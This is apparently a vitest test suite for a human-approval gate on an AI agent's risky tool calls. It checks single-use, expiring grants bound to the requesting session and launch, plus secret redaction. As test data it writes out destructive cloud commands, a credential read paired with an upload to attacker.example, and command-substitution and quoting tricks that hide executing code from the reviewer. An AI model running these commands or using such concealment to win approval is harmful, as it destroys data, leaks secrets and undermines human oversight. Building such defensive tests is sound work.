/**
 * Airlock human-approval grants (GH-294, T5).
 *
 * A needs-human-approval verdict records a pending approval the board shows. A
 * person grants it there (no passkey, user decision 2026-10-27, but never the
 * agent: the board header is required and the agent's internal header refuses),
 * and the grant is single-use and expiring: evaluate feeds it to the engine as
 * card.grants and consumes it when it lets the call through, exactly once. A
 * grant is bound to the approval key, so it never covers a different command.
 * A denial sticks: the same request is denied until someone approves it.
 *
 * The routes are mounted on a bare express app over a real SQLite store, with
 * the clock, the active card, the socket and the hub outbox handed in.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import express from 'express';
import request from 'supertest';
import * as os from 'os';
import * as path from 'path';
import * as fs from 'fs';
import { SQLiteStorageProvider } from '@agenfk/storage-sqlite';
import { DEFAULT_AIRLOCK_POLICY, normalizeAirlockPolicy } from '@agenfk/core';
import { removeTestDb } from './helpers/testDb';
import { registerAirlockRoutes, AIRLOCK_GRANT_TTL_MS } from '../airlock/routes';

const MUTATION = 'aws s3 rm s3://acme-prod/reports/2026.csv';
const OTHER_MUTATION = 'aws s3 rm s3://acme-prod/reports/2025.csv';
const BOARD = { 'x-agenfk-ui': '1' };

let storage: SQLiteStorageProvider;
let dbPath: string;
let tmp: string;
let clock: number;
let app: express.Express;
let work: { itemId: string; projectId: string } | null;
const recordHubEvent = vi.fn();
const emit = vi.fn();

async function setPolicy(over: Record<string, unknown>): Promise<void> {
  const current = await storage.getAirlockPolicy('local');
  await storage.putAirlockPolicy({
    scope: 'local',
    revision: (current?.revision ?? 0) + 1,
    policy: normalizeAirlockPolicy({ ...DEFAULT_AIRLOCK_POLICY, mode: 'enforce', ...over }),
    updatedAt: new Date().toISOString(),
    updatedBy: 'test',
    authority: 'local',
  }, current?.revision ?? 0);
}

beforeEach(async () => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'airlock-approvals-'));
  dbPath = path.join(tmp, 'db.sqlite');
  storage = new SQLiteStorageProvider();
  await storage.init({ path: dbPath });
  await storage.putAirlockPolicy({
    scope: 'local',
    revision: 1,
    policy: normalizeAirlockPolicy({ ...DEFAULT_AIRLOCK_POLICY, mode: 'enforce' }),
    updatedAt: new Date().toISOString(),
    updatedBy: 'test',
    authority: 'local',
  }, 0);
  clock = Date.parse('2026-10-27T12:00:00.000Z');
  work = { itemId: 'card-1', projectId: 'proj-1' };
  recordHubEvent.mockReset();
  emit.mockReset();
  app = express();
  app.use(express.json());
  // what the coverage middleware sets from a verified marker: the launch it was minted for
  app.use((req: any, _res, next) => {
    const launch = req.headers['x-test-launch'];
    if (typeof launch === 'string') { req.airlockSession = launch; req.airlockProject = 'proj-1'; }
    next();
  });
  registerAirlockRoutes(app, {
    storage: () => storage,
    hubJoined: () => false,
    recordHubEvent,
    emit,
    activeWork: () => work,
    stateFile: () => path.join(tmp, 'airlock-state.json'),
    now: () => clock,
  });
});

afterEach(async () => {
  await removeTestDb(dbPath, () => storage.shutdown());
  fs.rmSync(tmp, { recursive: true, force: true });
});

const evaluate = (command: string, extra: Record<string, unknown> = {}) => evaluateArgs({ command }, extra);
const evaluateArgs = (args: Record<string, unknown>, extra: Record<string, unknown> = {}) => request(app).post('/airlock/evaluate').send({
  client: 'pi',
  model: { provider: 'cloudflare-workers-ai', id: '@cf/zai-org/glm-5.2' },
  toolName: 'bash',
  args,
  sessionId: 'sess-1',
  ...extra,
});

/** Every row the board can reach: pending, recent and denied. */
async function listed(): Promise<any[]> {
  const body = (await request(app).get('/airlock/approvals')).body;
  return [...(body.pending ?? []), ...(body.recent ?? []), ...(body.denied ?? [])];
}
const rowOf = async (key: string) => (await listed()).find(r => r.key === key);

async function needsApproval(command = MUTATION): Promise<string> {
  const res = await evaluate(command);
  expect(res.status, JSON.stringify(res.body)).toBe(200);
  expect(res.body.verdict.decision).toBe('needs-human-approval');
  return res.body.verdict.approvalKey as string;
}

/** A person's answer, for the generation the board shows (or the one given). */
async function answer(action: 'grant' | 'deny', key: string, headers: Record<string, string> = BOARD, generation?: number) {
  const gen = generation ?? (await rowOf(key))?.generation ?? 1;
  return request(app).post(`/airlock/approvals/${encodeURIComponent(key)}/${action}`).set(headers).send({ generation: gen });
}
const grant = (key: string, headers: Record<string, string> = BOARD, generation?: number) => answer('grant', key, headers, generation);
const deny = (key: string, headers: Record<string, string> = BOARD, generation?: number) => answer('deny', key, headers, generation);

describe('pending approvals', () => {
  it('needs-approval records a pending request with key, rule, card, project and session', async () => {
    const key = await needsApproval();
    const res = await request(app).get('/airlock/approvals');
    expect(res.status).toBe(200);
    expect(res.body.pending).toHaveLength(1);
    const row = res.body.pending[0];
    expect(row).toMatchObject({ key, rule: 'cloud-mutation', itemId: 'card-1', projectId: 'proj-1', sessionId: 'sess-1', status: 'pending' });
    expect(row.summary).toContain('aws s3 rm');
    expect(emit).toHaveBeenCalledWith('airlock_approvals_changed', expect.anything());
    expect(recordHubEvent).toHaveBeenCalledWith(expect.objectContaining({ type: 'airlock.approval', payload: expect.objectContaining({ action: 'requested', key }) }));
  });

  it('the summary is redacted before it is stored', async () => {
    await needsApproval('aws s3 rm s3://acme-prod/x --profile prod token=supersecretvalue123');
    const res = await request(app).get('/airlock/approvals');
    expect(res.body.pending[0].summary).not.toContain('supersecretvalue123');
  });

  it('a dry run records nothing', async () => {
    const res = await evaluate(MUTATION, { dryRun: true });
    expect(res.body.verdict.decision).toBe('needs-human-approval');
    expect((await request(app).get('/airlock/approvals')).body.pending).toHaveLength(0);
  });
});

describe('who may grant', () => {
  it('without the board header: 403, nothing granted', async () => {
    const key = await needsApproval();
    expect((await grant(key, {})).status).toBe(403);
    expect((await evaluate(MUTATION)).body.verdict.decision).toBe('needs-human-approval');
  });

  it("with the agent's internal header (even beside the board header): 403", async () => {
    const key = await needsApproval();
    expect((await grant(key, { ...BOARD, 'x-agenfk-internal': 'token' })).status).toBe(403);
    expect((await deny(key, { ...BOARD, 'x-agenfk-internal': 'token' })).status).toBe(403);
  });

  it('an unknown key is 404', async () => {
    expect((await grant('airlock-v1:cloud-mutation:nope')).status).toBe(404);
    expect((await deny('airlock-v1:cloud-mutation:nope')).status).toBe(404);
  });
});

describe('a grant', () => {
  it('lets the same capability through once, then it needs approval again', async () => {
    const key = await needsApproval();
    const granted = await grant(key);
    expect(granted.status, JSON.stringify(granted.body)).toBe(200);
    expect(granted.body.approval.expiresAt).toBe(new Date(clock + AIRLOCK_GRANT_TTL_MS).toISOString());
    expect(emit).toHaveBeenCalledWith('airlock_approvals_changed', expect.anything());
    expect(recordHubEvent).toHaveBeenCalledWith(expect.objectContaining({ type: 'airlock.approval', payload: expect.objectContaining({ action: 'granted', key }) }));

    const first = await evaluate(MUTATION);
    expect(first.body.verdict).toEqual({ decision: 'allow', why: 'approved' });

    const second = await evaluate(MUTATION);
    expect(second.body.verdict.decision).toBe('needs-human-approval');
    expect(second.body.verdict.approvalKey).toBe(key);
    // The re-request is pending again for a person to decide.
    expect((await request(app).get('/airlock/approvals')).body.pending.map((r: any) => r.key)).toEqual([key]);
  });

  it("doesn't cover a different command, and is not spent by it", async () => {
    const key = await needsApproval();
    await grant(key);
    const other = await evaluate(OTHER_MUTATION);
    expect(other.body.verdict.decision).toBe('needs-human-approval');
    expect(other.body.verdict.approvalKey).not.toBe(key);
    expect((await evaluate(MUTATION)).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
  });

  it('a dry run sees the grant but does not spend it', async () => {
    const key = await needsApproval();
    await grant(key);
    expect((await evaluate(MUTATION, { dryRun: true })).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
    expect((await evaluate(MUTATION)).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
    expect((await evaluate(MUTATION)).body.verdict.decision).toBe('needs-human-approval');
  });

  it('is ignored once expired', async () => {
    const key = await needsApproval();
    await grant(key);
    clock += AIRLOCK_GRANT_TTL_MS + 1000;
    const res = await evaluate(MUTATION);
    expect(res.body.verdict.decision).toBe('needs-human-approval');
    expect(res.body.verdict.approvalKey).toBe(key);
  });

  it('is consumed exactly once when two calls race for it', async () => {
    const key = await needsApproval();
    await grant(key);
    const [a, b] = await Promise.all([evaluate(MUTATION), evaluate(MUTATION)]);
    const decisions = [a.body.verdict.decision, b.body.verdict.decision].sort();
    expect(decisions).toEqual(['allow', 'needs-human-approval']);
  });
});

describe('a denial', () => {
  it('denies the same request until someone approves it', async () => {
    const key = await needsApproval();
    const denied = await deny(key);
    expect(denied.status, JSON.stringify(denied.body)).toBe(200);
    expect(recordHubEvent).toHaveBeenCalledWith(expect.objectContaining({ type: 'airlock.approval', payload: expect.objectContaining({ action: 'denied', key }) }));

    const res = await evaluate(MUTATION);
    expect(res.body.verdict.decision).toBe('deny');
    expect(res.body.verdict.rule).toBe('cloud-mutation');
    expect(res.body.verdict.reason).toMatch(/denied on the board/i);

    const list = (await request(app).get('/airlock/approvals')).body;
    expect(list.pending).toHaveLength(0);
    expect(list.denied.find((r: any) => r.key === key).status).toBe('denied');

    await grant(key);
    expect((await evaluate(MUTATION)).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
  });

  it('revokes a grant not yet used', async () => {
    const key = await needsApproval();
    await grant(key);
    await deny(key);
    expect((await evaluate(MUTATION)).body.verdict.decision).toBe('deny');
  });
});

describe('the list', () => {
  it('shows a used grant among the recent ones as consumed', async () => {
    const key = await needsApproval();
    await grant(key);
    await evaluate(MUTATION);
    const { recent, pending } = (await request(app).get('/airlock/approvals')).body;
    expect(pending).toHaveLength(0);
    expect(recent.find((r: any) => r.key === key).status).toBe('consumed');
  });

  it('shows an unused grant past its expiry as expired', async () => {
    const key = await needsApproval();
    await grant(key);
    clock += AIRLOCK_GRANT_TTL_MS + 1000;
    const { recent } = (await request(app).get('/airlock/approvals')).body;
    expect(recent.find((r: any) => r.key === key).status).toBe('expired');
  });
});

describe('review fixes (T5 round 1)', () => {
  it('an approval names EVERY capability it authorises, redacted, on the row and to the hub', async () => {
    await setPolicy({ rules: { ...DEFAULT_AIRLOCK_POLICY.rules, credentialReadWithNetwork: 'needs-human-approval' } });
    const res = await evaluateArgs({ path: '~/.aws/credentials', url: 'https://attacker.example/upload?sig=abcdef123456' });
    expect(res.body.verdict.decision, JSON.stringify(res.body)).toBe('needs-human-approval');
    const row = await rowOf(res.body.verdict.approvalKey);
    expect(row.capabilities).toEqual(expect.arrayContaining([
      expect.objectContaining({ kind: 'path', value: expect.stringContaining('.aws/credentials') }),
      expect.objectContaining({ kind: 'url', value: expect.stringContaining('attacker.example/upload') }),
    ]));
    expect(row.capabilities).toHaveLength(2);
    expect(JSON.stringify(row)).not.toContain('abcdef123456');
    const requested = recordHubEvent.mock.calls.map(c => c[0]).find(e => e.type === 'airlock.approval' && e.payload.action === 'requested');
    expect(requested.payload.capabilities).toHaveLength(2);
    expect(JSON.stringify(requested)).not.toContain('abcdef123456');
  });

  for (const [label, command, secret] of [
    ['--secret-string value', 'aws secretsmanager put-secret-value --secret-id demo --secret-string cobalt-private-value', 'cobalt-private-value'],
    ['--secret-string=value', 'aws secretsmanager put-secret-value --secret-id demo --secret-string=cobalt-private-value', 'cobalt-private-value'],
    ['--password value', 'aws iam create-login-profile --user-name u --password pw-private-9', 'pw-private-9'],
    ['--master-user-password=value', 'aws rds modify-db-instance --db-instance-identifier db --master-user-password=hunter2-private', 'hunter2-private'],
    ['--api-key value', 'aws apigateway create-usage-plan-key --api-key ak-private-123 --key-type API_KEY', 'ak-private-123'],
  ] as const) {
    it(`a secret option's value (${label}) never reaches the row, the socket, the hub or the decision log`, async () => {
      const key = await needsApproval(command);
      expect(JSON.stringify(await rowOf(key))).not.toContain(secret);
      expect(JSON.stringify(emit.mock.calls)).not.toContain(secret);
      expect(JSON.stringify(recordHubEvent.mock.calls)).not.toContain(secret);
      expect(JSON.stringify((await request(app).get('/airlock/decisions')).body)).not.toContain(secret);
    });
  }

  it('a grant is bound to the session that asked: another session cannot spend it, or take it over', async () => {
    const key = await needsApproval();
    await grant(key);
    const other = await evaluate(MUTATION, { sessionId: 'sess-2' });
    expect(other.body.verdict.decision).toBe('needs-human-approval');
    expect((await evaluate(MUTATION)).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
  });

  it('a grant is bound to the card that asked', async () => {
    const key = await needsApproval();
    await grant(key);
    work = { itemId: 'card-2', projectId: 'proj-1' };
    expect((await evaluate(MUTATION)).body.verdict.decision).toBe('needs-human-approval');
    work = { itemId: 'card-1', projectId: 'proj-1' };
    expect((await evaluate(MUTATION)).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
  });

  it('grant needs the generation it answers', async () => {
    const key = await needsApproval();
    const res = await request(app).post(`/airlock/approvals/${encodeURIComponent(key)}/grant`).set(BOARD).send({});
    expect(res.status).toBe(400);
  });

  it('a repeated grant is idempotent: it does not renew the expiry', async () => {
    const key = await needsApproval();
    const first = await grant(key);
    clock += 10 * 60 * 1000;
    const again = await grant(key);
    expect(again.status).toBe(200);
    expect(again.body.approval.expiresAt).toBe(first.body.approval.expiresAt);
  });

  it('a replayed grant after the grant was used does not bring it back', async () => {
    const key = await needsApproval();
    const generation = (await rowOf(key)).generation;
    await grant(key, BOARD, generation);
    expect((await evaluate(MUTATION)).body.verdict.decision).toBe('allow');
    const used = await rowOf(key);
    const replay = await grant(key, BOARD, generation);
    expect(replay.status).toBe(409);
    const after = await rowOf(key);
    expect(after.consumedAt).toBe(used.consumedAt);
    expect(after.expiresAt).toBe(used.expiresAt);
    expect(after.status).toBe('consumed');
    expect((await deny(key, BOARD, generation)).status).toBe(409);
  });

  it('an answer for an older generation of a reopened request is refused', async () => {
    const key = await needsApproval();
    const old = (await rowOf(key)).generation;
    await grant(key, BOARD, old);
    await evaluate(MUTATION);                       // used
    await needsApproval();                          // asked again: a new generation
    const reopened = await rowOf(key);
    expect(reopened.status).toBe('pending');
    expect(reopened.generation).toBeGreaterThan(old);
    expect((await grant(key, BOARD, old)).status).toBe(409);
    expect((await rowOf(key)).status).toBe('pending');
    expect((await grant(key, BOARD, reopened.generation)).status).toBe(200);
  });

  it('a call that needs two grants and holds one is blocked and spends nothing', async () => {
    const res = await evaluateArgs({ commands: ['aws s3 rm s3://acme/x', 'kubectl delete pod web-1'] });
    const first = res.body.verdict.approvalKey;
    await grant(first);
    const blocked = await evaluateArgs({ commands: ['aws s3 rm s3://acme/x', 'kubectl delete pod web-1'] });
    expect(blocked.body.verdict.decision).toBe('needs-human-approval');
    const second = blocked.body.verdict.approvalKey;
    expect(second).not.toBe(first);
    expect((await rowOf(first)).status).toBe('granted');
    await grant(second);
    expect((await evaluateArgs({ commands: ['aws s3 rm s3://acme/x', 'kubectl delete pod web-1'] })).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
    expect((await rowOf(first)).status).toBe('consumed');
    expect((await rowOf(second)).status).toBe('consumed');
  });

  it('a denial stays reachable after many newer answered requests', async () => {
    const key = await needsApproval();
    await deny(key);
    for (let i = 0; i < 60; i++) {
      const k = `airlock-v1:cloud-mutation:filler${i}`;
      await storage.upsertAirlockApproval({ key: k, rule: 'cloud-mutation', summary: 's', requestedAt: new Date(clock + (i + 1) * 1000).toISOString() });
      await storage.denyAirlockApproval(k, { deniedBy: 'x' });
    }
    for (let i = 0; i < 60; i++) {
      const k = `airlock-v1:cloud-mutation:used${i}`;
      await storage.upsertAirlockApproval({ key: k, rule: 'cloud-mutation', summary: 's', requestedAt: new Date(clock + (i + 100) * 1000).toISOString() });
    }
    const body = (await request(app).get('/airlock/approvals')).body;
    expect(body.denied.map((r: any) => r.key)).toContain(key);
    expect((await grant(key)).status).toBe(200);
    expect((await evaluate(MUTATION)).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
  });

  it("a request taken over by another session invalidates the board's answer to the first", async () => {
    const key = await needsApproval();                         // session 1, card 1
    const seen = await rowOf(key);
    expect(seen).toMatchObject({ sessionId: 'sess-1', itemId: 'card-1' });
    work = { itemId: 'card-2', projectId: 'proj-1' };
    await evaluate(MUTATION, { sessionId: 'sess-2' });         // same capability, someone else
    const res = await grant(key, BOARD, seen.generation);      // the person approves what they saw
    expect(res.status).toBe(409);
    expect((await rowOf(key)).status).toBe('pending');
    expect((await evaluate(MUTATION, { sessionId: 'sess-2' })).body.verdict.decision).toBe('needs-human-approval');
  });

  it('a replayed approval cannot reverse a later denial', async () => {
    const key = await needsApproval();
    const g1 = (await rowOf(key)).generation;
    expect((await grant(key, BOARD, g1)).status).toBe(200);
    expect((await deny(key)).status).toBe(200);
    const denied = await rowOf(key);
    expect((await grant(key, BOARD, g1)).status).toBe(409);
    expect(await rowOf(key)).toMatchObject({ status: 'denied', deniedAt: denied.deniedAt, expiresAt: null, grantedAt: null });
    expect((await evaluate(MUTATION)).body.verdict.decision).toBe('deny');
  });

  it('after a denial, a replayed deny or an approve for the version before it is refused', async () => {
    const key = await needsApproval();
    const g1 = (await rowOf(key)).generation;
    expect((await deny(key, BOARD, g1)).status).toBe(200);
    expect((await deny(key, BOARD, g1)).status).toBe(409);
    expect((await grant(key, BOARD, g1)).status).toBe(409);
    expect((await rowOf(key)).status).toBe('denied');
  });

  it('every denial stays listed, however many there are', async () => {
    const key = await needsApproval();
    await deny(key);
    // One commit for the 2200 writes: one disk sync each took the Windows runner past 30s.
    const db: any = (storage as any).database;
    db.exec('BEGIN');
    try {
      for (let i = 0; i < 1100; i++) {
        const k = `airlock-v1:cloud-mutation:many${i}`;
        await storage.upsertAirlockApproval({ key: k, rule: 'cloud-mutation', summary: 's', requestedAt: new Date(clock + (i + 1) * 1000).toISOString() });
        await storage.denyAirlockApproval(k, { deniedBy: 'x' });
      }
      db.exec('COMMIT');
    } catch (e) {
      db.exec('ROLLBACK');
      throw e;
    }
    const body = (await request(app).get('/airlock/approvals')).body;
    expect(body.denied).toHaveLength(1101);
    expect(body.denied.map((r: any) => r.key)).toContain(key);
  }, 30_000);

  it('an approval shows the whole command, past any log-excerpt cap, still redacted; the log stays an excerpt', async () => {
    const tail = 'aws s3 rm s3://production --recursive --token=tok-secret-1';
    const command = `printf '${'a'.repeat(600)}'; ${tail}`;
    const key = await needsApproval(command);
    const row = await rowOf(key);
    const value = row.capabilities[0].value as string;
    expect(value).toContain('s3://production --recursive');
    expect(value).not.toContain('tok-secret-1');
    expect(value.endsWith('…')).toBe(false);
    expect(row.capabilities[0].complete).not.toBe(false);
    // The decision log and the hub keep the capped excerpt.
    const logged = (await request(app).get('/airlock/decisions')).body.decisions[0];
    expect(logged.target.length).toBeLessThanOrEqual(501);
    expect(logged.target).not.toContain('s3://production');
    const requested = recordHubEvent.mock.calls.map(c => c[0]).find(e => e.type === 'airlock.approval' && e.payload.action === 'requested');
    expect(JSON.stringify(requested)).not.toContain('s3://production');
    expect(JSON.stringify(recordHubEvent.mock.calls)).not.toContain('tok-secret-1');
  });

  it('a value too long to store whole is marked incomplete, and cannot be approved', async () => {
    const command = `printf '${'b'.repeat(70 * 1024)}'; aws s3 rm s3://production --recursive`;
    const key = await needsApproval(command);
    const row = await rowOf(key);
    expect(row.capabilities[0].complete).toBe(false);
    const res = await grant(key);
    expect(res.status).toBe(409);
    expect(res.body.message).toMatch(/could not be shown in full/i);
    expect((await rowOf(key)).status).toBe('pending');
  });

  for (const [label, command] of [
    ['$( )', 'aws secretsmanager put-secret-value --secret-id demo --secret-string "$(aws s3 rm s3://production --recursive)"'],
    ['backticks', 'aws secretsmanager put-secret-value --secret-id demo --secret-string "`aws s3 rm s3://production --recursive`"'],
    ['<( )', 'aws secretsmanager put-secret-value --secret-id demo --secret-string <(aws s3 rm s3://production --recursive)'],
    ['--password=$( )', 'aws iam create-login-profile --user-name u --password=$(aws s3 rm s3://production)'],
    ['; in double quotes', 'aws secretsmanager put-secret-value --secret-id demo --secret-string "x; aws s3 rm s3://production"'],
    // The invariant holds regardless of quoting: over-refusing is the accepted failure.
    ['single-quoted ; | &', "aws secretsmanager put-secret-value --secret-id demo --secret-string 'p;w|d&x-literal'"],
  ] as const) {
    it(`redaction that would hide code that runs (${label}) makes the request unapprovable`, async () => {
      const key = await needsApproval(command);
      const row = await rowOf(key);
      expect(row.capabilities.some((c: any) => c.concealed === true)).toBe(true);
      const res = await grant(key);
      expect(res.status).toBe(409);
      expect(res.body.message).toMatch(/hide code that runs/i);
      expect((await rowOf(key)).status).toBe('pending');
    });
  }

  for (const [label, command, secret] of [
    ['a literal', 'aws secretsmanager put-secret-value --secret-id demo --secret-string abc123-literal', 'abc123-literal'],
  ] as const) {
    // Changed on purpose (review round 7): detecting "code that runs" in shell
    // text cannot be complete (bash -''c, newlines, $var execution), so ANY
    // redaction in a command makes it unapprovable. The secret stays hidden.
    it(`a command with a redacted literal secret (${label}) is refused, the secret still hidden`, async () => {
      const key = await needsApproval(command);
      const row = await rowOf(key);
      expect(row.capabilities.some((c: any) => c.concealed === true)).toBe(true);
      expect(JSON.stringify(row)).not.toContain(secret);
      expect((await grant(key)).status).toBe(409);
    });
  }

  it('bash -c hiding a command substitution inside an assignment is refused', async () => {
    const key = await needsApproval(`bash -c 'token="$(aws s3 rm s3://production --recursive)"'`);
    const row = await rowOf(key);
    expect(row.capabilities.some((c: any) => c.concealed === true)).toBe(true);
    expect((await grant(key)).status).toBe(409);
  });

  it('a redaction marker planted in the command does not hide a redaction that happened', async () => {
    // Inferring "something was redacted" from marker counts let a planted
    // [REDACTED] balance the real one; the pipeline must report it directly.
    const key = await needsApproval(`bash -c 'token="[REDACTED]$(aws s3 rm s3://production --recursive)"'`);
    const row = await rowOf(key);
    expect(row.capabilities.some((c: any) => c.concealed === true)).toBe(true);
    expect((await grant(key)).status).toBe(409);
  });

  it('a quoted interpreter flag with newline-separated code cannot hide a redacted command', async () => {
    const key = await needsApproval(`bash -''c 'token="aws s3 rm s3://production --recursive"\n$token\naws s3 rm s3://scratch/review-test'`);
    const row = await rowOf(key);
    expect(row.capabilities.some((c: any) => c.concealed === true)).toBe(true);
    expect((await grant(key)).status).toBe(409);
  });

  describe('a secret header on an upload', () => {
    beforeEach(async () => { await setPolicy({ rules: { ...DEFAULT_AIRLOCK_POLICY.rules, uploadToUnlistedHost: 'needs-human-approval' } }); });

    it('with a pipe is refused', async () => {
      const key = await needsApproval("curl -H 'X-Api-Key: k-private-1' -T report.csv https://h.example/up | jq .");
      const row = await rowOf(key);
      expect(row.capabilities.some((c: any) => c.concealed === true)).toBe(true);
      expect((await grant(key)).status).toBe(409);
    });

    it('with no executable syntax is refused too, the secret still hidden', async () => {
      const key = await needsApproval("curl -H 'X-Api-Key: k-private-1' -T report.csv https://h.example/up");
      const row = await rowOf(key);
      expect(row.capabilities.some((c: any) => c.concealed === true)).toBe(true);
      expect(JSON.stringify(row)).not.toContain('k-private-1');
      expect((await grant(key)).status).toBe(409);
    });
  });
});

describe('a grant belongs to the launch that asked for it (da69b17a review)', () => {
  // The session id and the card are what the caller states, and another launch can read them
  // (runs, token events): only the launch, read from a marker no sandbox can mint, binds a grant.
  const fromLaunch = (launch: string | null, extra: Record<string, unknown> = {}) =>
    launch ? evaluate(MUTATION, extra).set('x-test-launch', launch) : evaluate(MUTATION, extra);

  it('another launch stating the same session and card cannot spend it; the launch that asked still can', async () => {
    const asked = await fromLaunch('launch-a');
    expect(asked.body.verdict.decision).toBe('needs-human-approval');
    const key = asked.body.verdict.approvalKey;
    expect((await grant(key)).status).toBe(200);
    const thief = await fromLaunch('launch-b');
    expect(thief.body.verdict.decision).toBe('needs-human-approval');
    expect((await rowOf(key)).status).toBe('granted');
    expect((await fromLaunch('launch-a')).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
  });

  it('a grant asked on the host is not a sandbox\'s to spend, nor a sandbox\'s grant the host\'s', async () => {
    const key = await needsApproval();
    expect((await grant(key)).status).toBe(200);
    expect((await fromLaunch('launch-a')).body.verdict.decision).toBe('needs-human-approval');
    expect((await fromLaunch(null)).body.verdict).toEqual({ decision: 'allow', why: 'approved' });

    work = { itemId: 'card-2', projectId: 'proj-1' };
    const sandboxed = (await fromLaunch('launch-a', { sessionId: 'sess-9' })).body.verdict.approvalKey;
    expect((await grant(sandboxed)).status).toBe(200);
    expect((await fromLaunch(null, { sessionId: 'sess-9' })).body.verdict.decision).toBe('needs-human-approval');
    expect((await fromLaunch('launch-a', { sessionId: 'sess-9' })).body.verdict).toEqual({ decision: 'allow', why: 'approved' });
  });

  it("a request re-asked by another launch invalidates the board's answer to the first", async () => {
    const key = (await fromLaunch('launch-a')).body.verdict.approvalKey;
    const seen = await rowOf(key);
    await fromLaunch('launch-b');
    expect((await grant(key, BOARD, seen.generation)).status).toBe(409);
    expect((await rowOf(key)).status).toBe('pending');
  });
});
